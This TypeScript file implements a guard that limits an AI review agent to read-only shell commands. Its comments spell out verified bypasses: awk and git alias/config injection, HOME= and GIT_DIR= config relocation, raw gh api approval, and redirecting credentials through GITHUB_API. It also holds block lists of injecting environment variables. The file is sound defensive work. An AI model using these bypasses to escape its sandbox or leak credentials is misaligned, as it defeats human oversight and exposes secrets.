// bash-guard — pi extension enforcing the sessions' no-exec policy at the
// tool-call boundary. Review sessions read code; they never run it. The guard
// inspects every bash tool call and blocks any segment whose program is not on
// the read-only allowlist, plus mutating `gh` and `git` verbs (sanctioned mutations go
// through the repo's own scripts/*.sh surface, which IS allowed for the
// specific script basenames below — approve-pr.sh, mint-token.sh (read-only
// gh needs it) and the pr-*/post-review/reply-thread helpers; deploy.sh
// stays unreachable).
//
// The checker is pure (checkBashCommand) so tests need no pi. The pi hookup
// (`pi.on("tool_call", …)` returning {block, reason}) is a VERIFIED capability
// per the pi control-surface findings (§5); the exact payload field names
// remain VERIFY-ON-PIN.
//
// This guard is ONE LAYER of the exec boundary, not the whole of it. It vets
// command strings, and a command guard never sees a FILE the session writes —
// which is the decisive ingredient in every bypass of a string-only guard. So:
//
//   · it also vets the WRITE tools, on one question — is this path a
//     PROTECTED write target (`isProtectedWriteTarget`)? That is git's
//     configuration surface (`isGitConfigSurface` — the repo config scope,
//     where a plain `git diff` executes a program named by
//     `<clone>/.git/config` with no suspicious token in the command at all),
//     this system's own policy surface (`isPolicySurface` — config.toml, the
//     sanctioned scripts, the compiled guard, the seeds), the memory-scope
//     files a session's own recall reads (`isMemoryScopeSurface` — the recall
//     hint and the retired list), and the wake-delivery files
//     (`isDeliverySurface` — the inject dirs and the bridge's `.done/`);
//   · the global/XDG/system scopes are closed OUTSIDE this file, by
//     `sessionGitConfigPins` in src/sessions.ts, which pins where git looks for
//     configuration at spawn. The guard's job there is only to stop a caller
//     RE-POINTING the pin (COMMAND_INJECTING_ENV).
import { readFileSync, realpathSync } from "node:fs";
import { posix } from "node:path";
import type {
  ExtensionAPI,
  ExtensionFactory,
  ToolCallEvent,
} from "@earendil-works/pi-coding-agent";

/**
 * Read-only programs a review session may run directly.
 *
 * **`awk` is deliberately ABSENT, and must not be re-added.** No regex gating
 * of awk is sound: it is a programming language in which `system(x)`,
 * `x | getline`, `print | x` and `print > x` are all first-class and every one
 * takes an ARBITRARY EXPRESSION, so a bare identifier holding the command
 * defeats any rule keyed on the token after the operator. VERIFIED executing:
 *
 *     awk 'BEGIN{c="sh"; print "<cmd>" | c}'        → ran <cmd>
 *     awk 'BEGIN{f="<path>"; print "x" > f}'        → wrote <path>
 *     awk 'BEGIN{f=".git/config"; printf … >> f}'   → then a plain `git diff` ran <cmd>
 *
 * The first is arbitrary execution with no config file touched, so the
 * round-boundary integrity check cannot see it either.
 *
 * The cost is close to zero: `awk` appears in no prompt, no agent and no
 * session-sanctioned script. A reviewer keeps `rg`, `grep`, `jq`, `cut`,
 * `sort`, `uniq`, `head`, `tail`, `wc`, `nl`, `tr` and `sed -n`; `gawk`,
 * `mawk` and `nawk` are off ALLOWED too.
 *
 * `sed` stays, on a narrower argument: its script language is small and
 * fixed — its file/exec verbs are the `e`/`w`/`W`/`r`/`R` commands and the
 * `e`/`w` flags of `s` — so `checkSedInvocation` PARSES every invocation
 * (options, addresses, any `s` delimiter) and refuses anything it cannot
 * classify. awk's language takes an expression anywhere; sed's does not.
 *
 * Exported in ORDER because the sentence every built pass reads ("Allowed
 * commands: …", `src/include.ts`) is rendered from this array: a model told a
 * tool exists and then refused reads the refusal as a malfunction, so the
 * enforcing half is the only author of the advertised half;
 * `tests/fences.test.ts` holds the advertised set equal to this array, runs
 * every advertised program through `checkBashCommand` (from source), and
 * separately checks the rendered sentence against `dist/src/include.js`.
 */
export const ALLOWED_PROGRAMS: readonly string[] = [
  "git",
  "rg",
  "grep",
  "cat",
  "ls",
  "find",
  "head",
  "tail",
  "wc",
  "jq",
  "sed",
  "sort",
  "uniq",
  "diff",
  "gh",
  "echo",
  "printf",
  "cut",
  "tr",
  "xargs",
  "dirname",
  "basename",
  "test",
  "true",
  "false",
  "date",
  "nl",
  "stat",
];
const ALLOWED = new Set(ALLOWED_PROGRAMS);

/** Programs whose whole point is to run code the caller supplies. They are off
 * ALLOWED, so the generic refusal already covers them — this exists only so the
 * reason names the replacement instead of leaving the model to guess and retry.
 * (`node`/`python`/… are handled by AGENT_SPAWNERS with their own reason.) */
const INTERPRETER_REASONS: Readonly<Record<string, string>> = {
  awk: "exec policy: 'awk' is a programming language that can run commands (system(), `print | cmd`, `cmd | getline`) and write files, including through a variable no guard can read — use rg/grep/jq/cut/sort/sed -n for text",
  gawk: "exec policy: 'gawk' is awk — see the awk rule; use rg/grep/jq/cut/sort/sed -n for text",
  mawk: "exec policy: 'mawk' is awk — see the awk rule; use rg/grep/jq/cut/sort/sed -n for text",
  nawk: "exec policy: 'nawk' is awk — see the awk rule; use rg/grep/jq/cut/sort/sed -n for text",
  perl: "exec policy: 'perl' runs arbitrary code — use rg/grep/jq/cut/sort/sed -n for text",
  ruby: "exec policy: 'ruby' runs arbitrary code — use rg/grep/jq/cut/sort/sed -n for text",
  php: "exec policy: 'php' runs arbitrary code — use rg/grep/jq/cut/sort/sed -n for text",
};

/** Sanctioned sandbox scripts — the controlled surface for routine GitHub
 * reads and gate-mirrored posting. mint-token.sh is sanctioned because the
 * templates allow raw READ-ONLY `gh`, which needs `GH_TOKEN="$(…)"`.
 * deploy.sh stays unreachable. */
const SANCTIONED_SCRIPTS = new Set([
  "approve-pr.sh",
  "mint-token.sh",
  "pr-context.sh",
  "pr-checks.sh",
  // Mandated by all three round templates. Read-only by construction — GETs
  // only, no method override, no body — and its two delegates, pr-threads.sh
  // and pr-checks.sh, are sanctioned too. `tests/fences.test.ts` derives this
  // set from the prompts, so the exec policy and the prompt contract cannot
  // disagree.
  "pr-self.sh",
  "pr-threads.sh",
  "post-review.sh",
  "reply-thread.sh",
  // `[review] render_outputs` (src/reviewrender.ts): reads the round's
  // findings record, writes the two pinned scratch files under state/. Posts
  // nothing; posting still goes through post-review.sh / approve-pr.sh.
  "render-review.sh",
  // The round templates stage the verdict at verdict/<name>.tmp and publish
  // it with this — one rename inside verdict/, so the daemon never reads a
  // half-written verdict. `mv` itself stays off ALLOWED: the script takes only
  // the two verdict-file name shapes, writes nothing outside verdict/, reads
  // no config and posts nothing. Its `--from-record` mode also READS the
  // round's own findings record to build the verdict from fields the session
  // already wrote — still no other write.
  "commit-verdict.sh",
]);

/** Agent-spawning programs. They are off ALLOWED already; this set exists so
 * the refusal tells the model what to do instead, and so the single-shepherd
 * invariant has a rule that greps.
 * The PR's main pi is the only scheduler of agents, and the `subagent` tool is
 * its only launcher. */
const AGENT_SPAWNERS = new Set([
  "pi",
  "claude",
  "codex",
  "node",
  "npm",
  "npx",
  "pnpm",
  "yarn",
  "bun",
  "bunx",
  "deno",
  "tsx",
  "ts-node",
]);

const AGENT_SPAWN_REASON =
  "exec policy: never spawn an agent or a runtime from bash — the `subagent` tool is the only launcher (single-shepherd invariant)";

/** Relative under scripts/ only: no `..`, no absolute paths, exactly one
 * path segment after scripts/. */
const SCRIPT_PATH_RE = /^(?:\.\/)?scripts\/([A-Za-z0-9._-]+\.sh)$/;

export interface BashCheck {
  allowed: boolean;
  reason?: string;
}

function block(reason: string): BashCheck {
  return { allowed: false, reason };
}

/**
 * What the guard's policy is judged against, resolved: the sandbox root that
 * owns the sanctioned script bytes, whether this is a regression replay
 * session, and the secrets dirs. `createBashGuard` builds one from its config
 * at construction; the exported pure checkers build one from the process (the
 * ambient policy below) when a caller passes none.
 */
interface GuardPolicy {
  sandboxRoot: string;
  /** A regression replay session (src/replay.ts), spawned with `QCR_REPLAY=1`
   * on its pi's own environment, which no bash command can change. It posts
   * nothing and reads nothing from GitHub, so no sandbox script is sanctioned
   * in it at all: the relative-spelling rule alone was reachable by
   * `cd <sandbox root> && bash scripts/post-review.sh …`. */
  replay: boolean;
  /** The secret-path context minus the cwd, which is per call. */
  secrets: Omit<SecretPathContext, "cwd">;
}

function sanctionedScript(
  token: string,
  cwd: string | null,
  policy: GuardPolicy,
): { sanctioned: boolean; name?: string } {
  const m = SCRIPT_PATH_RE.exec(token);
  if (!m) return { sanctioned: false };
  return {
    sanctioned: !policy.replay && trustedScriptCwd(cwd, policy) && SANCTIONED_SCRIPTS.has(m[1]!),
    name: m[1]!,
  };
}

/** Only the daemon-selected checkout owns the sanctioned script bytes. */
function trustedScriptCwd(cwd: string | null, policy: GuardPolicy): boolean {
  if (cwd === null) return false;
  try {
    return realpathSync.native(cwd) === realpathSync.native(policy.sandboxRoot);
  } catch {
    return false;
  }
}

/** A changed shell directory is not inferred from a reviewed path. Only an
 * explicit cd to the daemon's absolute root preserves script authorization;
 * every other cd conservatively invalidates it for this whole command. */
function scriptCwdForCommand(cmd: string, cwd: string | null, policy: GuardPolicy): string | null {
  for (const segment of splitShellSegments(cmd)) {
    const words = shellWords(segment).words;
    let at = 0;
    while (words[at] === "env" || /^\w+=/.test(words[at] ?? "")) at++;
    const program = (words[at] ?? "").replace(/^\(+/, "");
    if (program.slice(program.lastIndexOf("/") + 1) !== "cd") continue;
    const args = words.slice(at + 1).filter((word) => word !== "--");
    if (args.length !== 1 || !args[0]!.startsWith("/") || !trustedScriptCwd(args[0]!, policy))
      return null;
  }
  return cwd;
}

const REPLAY_NO_SCRIPTS =
  "exec policy: a regression replay session runs no sandbox script — it reads the tree and writes one findings file";

/**
 * `gh` is READ-ONLY, by ALLOWLIST: only the read verbs named here are allowed,
 * plus `gh api` without a mutating method or body flag. A blocklist would
 * leave verbs like `gh pr review <n> --approve` open — a direct approval
 * around the mutation gate, the CI gate and `dry_run`, using the installation
 * token the session can mint from the sanctioned `scripts/mint-token.sh`
 * (which carries `pull_requests: write`) — and would need extending every time
 * `gh` grows a verb. Every posting mutation goes through the sanctioned
 * scripts, which mirror the gate's guards.
 */
const GH_READONLY_VERBS: Readonly<Record<string, ReadonlySet<string>>> = {
  pr: new Set(["view", "list", "diff", "checks", "status"]),
  issue: new Set(["view", "list", "status"]),
  run: new Set(["view", "list"]),
  // `gh workflow run` DISPATCHES a workflow — CI execution the reviewer must
  // never start (scoping rule 2: the reviewer reads CI results, never runs it).
  workflow: new Set(["view", "list"]),
  release: new Set(["view", "list"]),
  repo: new Set(["view"]),
  label: new Set(["list"]),
  cache: new Set(["list"]),
  auth: new Set(["status"]),
};

/** `gh` namespaces that are read-only whatever the verb. */
const GH_READONLY_NAMESPACES: ReadonlySet<string> = new Set([
  "search",
  "status",
  "version",
  "help",
]);

/**
 * `gh api` flags that carry a REQUEST BODY, and so promote gh's default GET to
 * POST. Enumerated against `gh api --help` on gh 2.93.0 and confirmed
 * empirically against a loopback server:
 *
 *     gh api <path> --input f        → POST      gh api <path>                → GET
 *     gh api <path> --input=f        → POST      gh api <path> --method GET … → GET
 *
 * `--input` matters most: a session can write `{"event":"APPROVE"}` with its
 * ordinary write tool, mint the token from the sanctioned
 * `scripts/mint-token.sh`, and `gh api .../pulls/<n>/reviews --input` it — a
 * complete approval channel.
 *
 * NOTE — `-i` is deliberately NOT a body flag. In gh it is `--include` (print
 * response status line and headers), a pure READ flag; `--input` has no short
 * form, and no other short flag carries a body. Verified in `gh api --help`
 * and by probe: `gh api <path> -i` → GET.
 */
const GH_API_BODY_FLAGS: ReadonlySet<string> = new Set([
  "--input",
  "-f",
  "-F",
  "--field",
  "--raw-field",
]);
const GH_API_BODY_FLAG_ATTACHED = /^(--input|--field|--raw-field)=/;

/**
 * The SHORT body flags, structurally rather than by spelling.
 *
 * The set above is complete by flag NAME, but a name is not a form:
 * `-fevent=APPROVE` attaches the value, and `-if` clusters the boolean `-i` in
 * front of `-f`. Both send POST, verified on gh 2.93.0:
 *
 *     gh api <path> -fevent=APPROVE   → POST
 *     gh api <path> -Fevent=APPROVE   → POST
 *     gh api <path> -if event=APPROVE → POST
 *     gh api <path> -i                → GET
 *
 * So the rule is a shape, not more literals: any single-dash cluster
 * containing `f` or `F` carries a body;
 * `-i` alone contains neither, so `--include` keeps working. `-X`/`-XPOST`
 * contain neither either, and are handled by the explicit-method branch.
 */
const GH_API_SHORT_BODY_CLUSTER = /^-[A-Za-z]*[fF]/;

/**
 * What method will this `gh api` invocation actually send?
 *
 * An explicit `-X`/`--method` wins, otherwise a body flag promotes GET to
 * POST, otherwise it is gh's default GET. Only GET (and HEAD) is allowed.
 */
function ghApiEffectiveMethod(args: string[]): string {
  let explicit: string | null = null;
  let body = false;
  for (let j = 0; j < args.length; j++) {
    const a = args[j]!;
    if (a === "-X" || a === "--method") {
      explicit = (args[j + 1] ?? "").toUpperCase();
      continue;
    }
    const attached = /^(?:-X|--method=)(.+)$/.exec(a);
    if (attached) {
      explicit = attached[1]!.toUpperCase();
      continue;
    }
    if (
      GH_API_BODY_FLAGS.has(a) ||
      GH_API_BODY_FLAG_ATTACHED.test(a) ||
      GH_API_SHORT_BODY_CLUSTER.test(a)
    ) {
      body = true;
    }
  }
  if (explicit !== null) return explicit || "GET";
  return body ? "POST" : "GET";
}

function checkGh(args: string[]): BashCheck {
  // Step over leading `-`-prefixed tokens to find the namespace. NOTE: only the
  // token, never a value — gh's own global flags (`--version`, `--help`) take
  // none, and every `--repo`-style flag belongs to a subcommand and follows it.
  // So `gh --repo o/n pr view` lands on `o/n`, which is not a namespace and is
  // REFUSED. That fails closed, which is correct, and the reason names `o/n`
  // rather than `pr`.
  let i = 0;
  while (i < args.length && args[i]!.startsWith("-")) i++;
  const ns = args[i];
  if (ns === undefined) return { allowed: true }; // bare `gh` prints help
  if (ns === "api") {
    const method = ghApiEffectiveMethod(args.slice(i + 1));
    if (method !== "GET" && method !== "HEAD") {
      return block(
        `exec policy: this 'gh api' sends ${method}, not GET — every GitHub write goes through the ONE mutation gate (scripts/*.sh), never raw gh`,
      );
    }
    return { allowed: true };
  }
  if (GH_READONLY_NAMESPACES.has(ns)) return { allowed: true };
  const verbs = GH_READONLY_VERBS[ns];
  if (verbs === undefined) {
    return block(`exec policy: 'gh ${ns}' is not a sanctioned read-only gh command`);
  }
  // Skip flags between the namespace and its verb (`gh pr --help`).
  let k = i + 1;
  while (k < args.length && args[k]!.startsWith("-")) k++;
  const verb = args[k];
  if (verb === undefined) return { allowed: true }; // `gh pr` alone prints help
  if (verbs.has(verb)) return { allowed: true };
  return block(
    `exec policy: 'gh ${ns} ${verb}' is a mutating command — every GitHub write goes through the sanctioned scripts/*.sh, never raw gh`,
  );
}

/**
 * `git` is READ-ONLY too, and — like `gh` — by ALLOWLIST, which keeps `git
 * push` (a GitHub write around the one gate) and the discard family
 * (`reset --hard`, `checkout --`, `clean -fdx`, `stash`) out. A blocklist of
 * write verbs does not hold:
 *
 *   1. It is never closed: `send-pack` (the plumbing for `push`), `bundle`,
 *      `archive`, `svn`, `p4`, `daemon`, `fast-export`, `symbolic-ref`,
 *      `reflog`, `difftool`, `update-server-info`, `branch -D` / `tag -d`…
 *   2. It keys on the verb, and `-c alias.x='!<shell>' x` supplies a NEW verb
 *      in one token. VERIFIED executing.
 *   3. `git -C /some/repo <alias>` runs an alias out of that repo's own
 *      config. Under an allowlist the alias name is simply not a sanctioned
 *      read verb, so the whole class dies without enumerating it.
 *
 * A blocked read verb is a loud, recoverable refusal naming what to do; an
 * unblocked write verb is an ungated mutation. The failure modes are not
 * symmetric.
 */
const GIT_READONLY_VERBS: ReadonlySet<string> = new Set([
  "log",
  "show",
  "diff",
  "diff-tree",
  "diff-files",
  "diff-index",
  "status",
  "blame",
  "annotate",
  "cat-file",
  "rev-parse",
  "rev-list",
  "ls-files",
  "ls-tree",
  "ls-remote",
  "grep",
  "describe",
  "shortlog",
  "merge-base",
  "name-rev",
  "whatchanged",
  "show-ref",
  "show-branch",
  "check-ignore",
  "check-attr",
  "count-objects",
  "verify-commit",
  "verify-tag",
  "version",
  // `range-diff` is the natural tool for a force-push re-review (what changed
  // between the old and new versions of a series); `for-each-ref` is the
  // scriptable ref read.
  "range-diff",
  "for-each-ref",
  // A read of the remote. It cannot mutate GitHub, and the daemon fetches the
  // base into every worktree already — but a session occasionally needs a ref
  // the round did not anticipate, and refusing it would wedge that review.
  "fetch",
]);

/**
 * Namespaces whose read-only sub-form is allowed and whose write forms are not.
 * `branch` and `tag` list by default but delete with a flag; `worktree`,
 * `remote` and `config` all carry both.
 */
const GIT_READONLY_SUBVERBS: Readonly<Record<string, ReadonlySet<string>>> = {
  worktree: new Set(["list"]),
  remote: new Set(["-v", "--verbose", "show", "get-url"]),
  config: new Set(["--get", "--get-all", "--get-regexp", "--list", "-l"]),
  branch: new Set([
    "--list",
    "-l",
    "--contains",
    "--merged",
    "--no-merged",
    "--show-current",
    "-a",
    "-r",
    "-v",
    "-vv",
    "--all",
    "--remotes",
  ]),
  tag: new Set(["--list", "-l", "--contains", "--points-at", "--merged"]),
};

/**
 * Options that let git run a command of the caller's choosing.
 *
 * The family is **anything that changes WHICH CONFIG GIT READS, or names a
 * program directly** — three members:
 *
 *   1. INJECT config inline — `-c key=value`, `--config-env=key=ENVVAR`.
 *   2. NAME a program — `--upload-pack`, `--receive-pack`, `--exec`,
 *      `--exec-path` (where git looks for its own subcommand binaries).
 *   3. RELOCATE the config git reads — at ANY of its three scopes:
 *        · repo    — `--git-dir`, `--work-tree`, `GIT_DIR`, `GIT_WORK_TREE`
 *        · global  — `GIT_CONFIG_GLOBAL`, and the search path it falls back
 *                    to: `HOME` (`$HOME/.gitconfig`) and `XDG_CONFIG_HOME`
 *                    (`$XDG_CONFIG_HOME/git/config`)
 *        · system  — `GIT_CONFIG_SYSTEM`
 *      The env half lives in COMMAND_INJECTING_ENV below.
 *
 * All three end in the same place, because git executes config-supplied shell
 * from `alias.*` (`!cmd`), `core.pager`, `credential.helper` (`!cmd`),
 * `core.sshCommand`, `diff.external`, `diff.*.textconv` and `filter.*.clean`.
 *
 * VERIFIED by execution, not inferred:
 *
 *   git -c "alias.probe=!<cmd>" probe                     → ran <cmd>
 *   git --git-dir=<dir> diff --no-index <A> <B>           → ran <cmd>
 *   HOME=<dir> git diff --no-index <A> <B>                → ran <cmd>
 *   XDG_CONFIG_HOME=<dir> git diff --no-index <A> <B>     → ran <cmd>
 *
 * Category 3 is the worst of them. The minimum viable evil "repo" is ONE
 * PLAIN-TEXT FILE: `--no-index` means git never validates the directory as a
 * repository, so there is no `objects/`, no `refs/`, no `git init` and no exec
 * bit — a session writes the config with its ordinary write tool.
 * `--ext-diff` is NOT required, because `git diff` honours `diff.external` by
 * default. Note the implicit SEARCH PATH (`HOME`, `XDG_CONFIG_HOME`) is as
 * much a relocator as the explicit pointers (`GIT_CONFIG_GLOBAL`,
 * `GIT_CONFIG_SYSTEM`).
 *
 * `-C <dir>` is deliberately NOT here. `-C` DOES reach config: it chdirs, git
 * then DISCOVERS the repository there and reads its config, arriving at the
 * same `diff.external`. It stays allowed because discovery requires a VALID
 * repository whose config the session controls, and `git init` and
 * `git clone` are both off the verb allowlist above — so the session cannot
 * create one. That is a real bound, but a different one from "cannot reach
 * config".
 *
 * Options that can inject commands on either side of the verb. Top-level
 * `-c` is checked separately before the verb.
 *
 * `git show -c` / `git log -c` / `git diff-tree -c` is git's COMBINED
 * MERGE DIFF option, not config injection — and it is exactly the tool the
 * recheck needs: a hand-resolved conflict is audited against BOTH merge
 * parents. Git's top-level `-c` must precede the subcommand anyway, so the
 * before-verb check loses nothing.
 */
const GIT_COMMAND_INJECTING_OPTS =
  /^(?:--config-env|--upload-pack|--receive-pack|--exec|--exec-path|--git-dir|--work-tree)(?:=|$)/;

/**
 * The read verbs' own WRITE option. `--output=<file>` (and `--output <file>`)
 * is a diff option: `git log`, `git show`, `git diff` and every verb that
 * takes diff options write their output INTO THAT FILE, and
 * `--format=format:<text>` or a committed blob (`git show HEAD:<path>`) makes
 * the bytes anything at all. VERIFIED (git 2.55): `git show HEAD:a.json
 * --output <dir>/o2` wrote the blob byte for byte — past the write veto,
 * which reads redirections and `sed -i` only. A reviewer reads output on
 * stdout; it never needs git to write a file. Exact name only: git refuses
 * an abbreviation (`--outp`, `--outpu` — ambiguous with
 * `--output-indicator-*`), and `--output-indicator-new` is a read option.
 */
const GIT_OUTPUT_FILE_OPT = /^--output(?:=|$)/;

/**
 * `git grep`'s `--open-files-in-pager[=<cmd>]` / `-O[<cmd>]` RUNS the named
 * program on the matching files — VERIFIED: `git grep -O"touch <f>" a` and
 * `git grep -nO…` created the file. It is arbitrary execution through a read
 * verb, not a config relocation, so it is its own rule. parse-options accepts
 * any unique abbreviation of the long form (`--op`, `--open=…` VERIFIED),
 * and `-O` can end a short cluster (`-nO<cmd>`) — so a short cluster is
 * walked letter by letter, stopping at
 * the options that take the rest of the word as their value.
 */
const GIT_GREP_PAGER_LONG = "open-files-in-pager";
const GIT_GREP_SHORT_WITH_VALUE = new Set(["A", "B", "C", "e", "f", "m"]);
function isGitGrepPagerOpt(a: string): boolean {
  const long = /^--([a-z-]+)(?:=|$)/.exec(a);
  if (long) return long[1]!.length >= 2 && GIT_GREP_PAGER_LONG.startsWith(long[1]!);
  if (!/^-[^-]/.test(a)) return false;
  for (const ch of a.slice(1)) {
    if (ch === "O") return true;
    if (GIT_GREP_SHORT_WITH_VALUE.has(ch)) return false;
  }
  return false;
}

function checkGit(rawGitArgs: string[]): BashCheck {
  // Judged as git RECEIVES them: bash removes inner quotes and backslashes
  // before git parses an option, so `--up"load"-pack=…`, `--git-"dir"=…` and
  // `--out"put"=…` are the options they spell.
  const args = rawGitArgs.map(dequote).filter((a) => a.length > 0);
  // Leading global options, before the verb.
  let i = 0;
  while (i < args.length && args[i]!.startsWith("-")) {
    if (/^-c(?:=|$)/.test(args[i]!) || GIT_COMMAND_INJECTING_OPTS.test(args[i]!)) {
      return block(
        `exec policy: 'git ${args[i]}' can hand git a command to run (alias/pager/sshCommand/diff.external) — the reviewer never executes anything`,
      );
    }
    if (args[i] === "-C") i++; // a directory, not a verb — skip its value
    i++;
  }
  const verb = args[i];
  if (verb === undefined) return { allowed: true }; // bare `git` prints usage
  // …and after it, where the program-naming and config-relocating forms are
  // equally effective. `-c` is excluded here: see the constant above.
  for (const a of args.slice(i + 1)) {
    if (GIT_COMMAND_INJECTING_OPTS.test(a)) {
      return block(
        `exec policy: 'git ${verb} ${a}' can hand git a command to run — the reviewer never executes anything`,
      );
    }
    if (GIT_OUTPUT_FILE_OPT.test(a)) {
      return block(
        `exec policy: 'git ${verb} ${a}' makes git WRITE its output into a file of the caller's choosing — the reviewer reads git's output on stdout and never writes a file through it.`,
      );
    }
    if (verb === "grep" && isGitGrepPagerOpt(a)) {
      return block(
        `exec policy: 'git grep ${a}' runs a program on the matching files — the reviewer never executes anything. Read the matches on stdout.`,
      );
    }
  }
  const sub = GIT_READONLY_SUBVERBS[verb];
  if (sub !== undefined) {
    // POSITIONAL, not `some()` over every argument. A scan of all args would
    // accept the read-only marker wherever it appeared — including as the
    // VALUE of a write form, e.g. `git branch -m list`. The first token after
    // the verb is the one that decides what the command does.
    return sub.has(args[i + 1] ?? "")
      ? { allowed: true }
      : block(
          `exec policy: 'git ${verb}' is only allowed in its read-only form (${[...sub].join(", ")})`,
        );
  }
  if (verb === "push" || verb === "send-pack") {
    return block(
      `exec policy: 'git ${verb}' is a GitHub mutation — every write goes through the ONE mutation gate, never a session's shell`,
    );
  }
  if (GIT_READONLY_VERBS.has(verb)) return { allowed: true };
  return block(
    `exec policy: 'git ${verb}' is not a sanctioned read-only git command — this worktree is the daemon's and the reviewer only reads it (use 'git show <rev>:<path>' to read another revision)`,
  );
}

/**
 * Environment variables that name a PROGRAM for an otherwise-allowed command to
 * run — the env twin of `git -c`. `VAR=val` prefixes are skipped by the
 * splitter below, so without this a read verb carries the payload instead of
 * the verb doing it.
 *
 * VERIFIED, not inferred:
 *   GIT_EXTERNAL_DIFF="<cmd>" git diff --ext-diff -- <file>   → ran <cmd>
 *
 * The git family (pager, external diff, ssh, editor, askpass, and the
 * `GIT_CONFIG_*` set, which reproduces `-c` exactly) plus the generic loader
 * and shell hooks that would subvert ANY allowed program.
 */
const COMMAND_INJECTING_ENV = new Set([
  "GIT_PAGER",
  "PAGER",
  "GIT_EXTERNAL_DIFF",
  "GIT_DIFF_OPTS",
  "GIT_SSH",
  "GIT_SSH_COMMAND",
  "GIT_EDITOR",
  "GIT_SEQUENCE_EDITOR",
  "GIT_ASKPASS",
  "GIT_PROXY_COMMAND",
  "GIT_CONFIG",
  "GIT_CONFIG_GLOBAL",
  "GIT_CONFIG_SYSTEM",
  "GIT_CONFIG_COUNT",
  "GIT_ALTERNATE_OBJECT_DIRECTORIES",
  "GIT_TEMPLATE_DIR",
  // The env twins of `--git-dir` / `--work-tree` / `--exec-path`: the
  // config-RELOCATING third member of the family, at the REPO scope.
  // `GIT_DIR=<dir> git diff --no-index A B` runs `diff.external` out of
  // `<dir>/config` — VERIFIED executing, with `<dir>` holding nothing but
  // that one plain-text file.
  "GIT_DIR",
  "GIT_COMMON_DIR",
  "GIT_WORK_TREE",
  "GIT_EXEC_PATH",
  // …and the same category at the GLOBAL/XDG scope. `GIT_CONFIG_GLOBAL` and
  // `GIT_CONFIG_SYSTEM` above are the EXPLICIT pointers; these two are the
  // implicit SEARCH PATH those fall back to — `$HOME/.gitconfig` and
  // `$XDG_CONFIG_HOME/git/config`. Same primitive and the same cost as the
  // repo-scope form: one plain-text file written with the ordinary write tool,
  // plus one ALLOWED command.
  // VERIFIED executing: HOME=<dir> git diff --no-index A B.
  "HOME",
  "XDG_CONFIG_HOME",
  "EDITOR",
  "VISUAL",
  "SSH_ASKPASS",
  "LD_PRELOAD",
  "LD_AUDIT",
  "LD_LIBRARY_PATH",
  "DYLD_INSERT_LIBRARIES",
  "BASH_ENV",
  "ENV",
  "PATH",
  "SHELL",
  "IFS",
  "PYTHONSTARTUP",
  "NODE_OPTIONS",
  "PERL5OPT",
]);
/** `GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=!cmd` is `-c` by another name. */
const COMMAND_INJECTING_ENV_RE = /^GIT_CONFIG_(KEY|VALUE)_\d+$/;

/**
 * Environment variables that RELOCATE this system's own policy inputs — the
 * same primitive as `HOME=` above, aimed at us instead of at git (fenced by
 * `tests/fences.test.ts` and `tests/bash-guard.test.ts`).
 *
 * The posting scripts are sanctioned, and every guard knob they consult is
 * read out of `$QCR_CONFIG`. Without this,
 *
 *     QCR_CONFIG=/tmp/mine.toml bash scripts/approve-pr.sh 5 body.md
 *
 * would pass: `guard_enabled` treats a knob as ON unless the value is
 * literally `false`, so one hand-written TOML file — created with the ordinary
 * write tool — turns guards 2 through 5 off on a REAL approval. The same file
 * carries `dry_run`, so it would also flip a dry-run install into posting for
 * real (hard rule 1).
 *
 * `QCR_STATE_DB` relocates the database the guards query for the head mark and
 * the approval-withheld state; `QCR_DRYRUN_DIR` relocates where a suppressed
 * intent is recorded, which is the only evidence a dry-run run leaves.
 *
 * SCOPE: this closes the ENV-PREFIX spelling. The two further routes —
 * `bash -c '<sanctioned script> ; <anything>'` past the segment policy, and
 * overwriting the config / `guards.sh` / the posting scripts / the compiled
 * guard outright — are closed elsewhere: the `bash -c` payload is re-parsed as
 * its own command (`bashCPayload`, from `checkSegment`), and every
 * policy-carrying file is unwritable at BOTH the write-tool and the
 * shell-redirection boundary (`isPolicySurface`).
 *
 * `QCR_POSTING_RECEIPT_DIR` is a relocator, not an argument: it names a
 * DIRECTORY, exactly like `QCR_DRYRUN_DIR` and `QCR_STATE_DB` beside it, not a
 * per-call value like `QCR_EXPECTED_HEAD`; the daemon never sets it (it relies
 * on the scripts' default `$ROOT/state/posting-receipts`, and `verdicts.ts`
 * reads that same default), so blocking it breaks no dispatch path; and a
 * session has no business moving where the posting RECEIPT — the record that
 * settles a round — is written.
 *
 * `QCR_INSTALL` is a relocator too: the install locator (src/install.ts,
 * mirrored by scripts/install-locator.sh) finds the live config in
 * `$XDG_CONFIG_HOME/qcr/$QCR_INSTALL/`, so naming another install is
 * `QCR_CONFIG=` by another spelling. (`HOME=` and `XDG_CONFIG_HOME=`, the
 * other two inputs, are refused above as git relocators.) The daemon hands
 * each session the path it resolved as `QCR_CONFIG` in the pane environment —
 * a session's own `QCR_CONFIG=` prefix is still refused here.
 *
 * NOT here, deliberately: `QCR_EXPECTED_HEAD`, `QCR_POSTING_KEY`,
 * `QCR_ROUND_NO`, `QCR_POST_RESPONSE`. Those are per-invocation ARGUMENTS the
 * daemon hands the script — a session setting one changes what this call is
 * about, which the guards then check; it does not change what the guards ARE.
 * Blocking them would break the daemon's own dispatch path.
 */
const POLICY_RELOCATING_ENV = new Set([
  "QCR_CONFIG",
  "QCR_SANDBOX_ROOT",
  "QCR_INSTALL",
  "QCR_STATE_DB",
  "QCR_DRYRUN_DIR",
  "QCR_POSTING_RECEIPT_DIR",
]);

/**
 * Env prefixes that move where a sanctioned script SENDS the App's credentials.
 * Every script that talks to GitHub reads its host from `GITHUB_API`, and
 * `mint-token.sh` posts the App's signed JWT to it to mint an installation
 * token — so `GITHUB_API=http://anywhere scripts/mint-token.sh` would hand the
 * JWT (which can mint a token for every installation of the App) to a host
 * the session chose, through the one network channel this policy otherwise
 * leaves closed: curl, wget and every interpreter are refused. The daemon never
 * sets it for a session; the scripts' own default (`https://api.github.com`) is
 * the only host a review needs. Tests point the scripts at a loopback stub by
 * running them directly, never through this guard.
 */
const CREDENTIAL_RELOCATING_ENV = new Set(["GITHUB_API"]);

function envInjectionBlock(name: string): BashCheck | null {
  if (CREDENTIAL_RELOCATING_ENV.has(name)) {
    return block(
      `exec policy: '${name}=' moves the host the sanctioned scripts send the App's credentials to — a session never chooses where they go`,
    );
  }
  if (POLICY_RELOCATING_ENV.has(name)) {
    return block(
      `exec policy: '${name}=' relocates the posting guards' own configuration — the guards are not a knob a session may move`,
    );
  }
  if (!COMMAND_INJECTING_ENV.has(name) && !COMMAND_INJECTING_ENV_RE.test(name)) return null;
  return block(
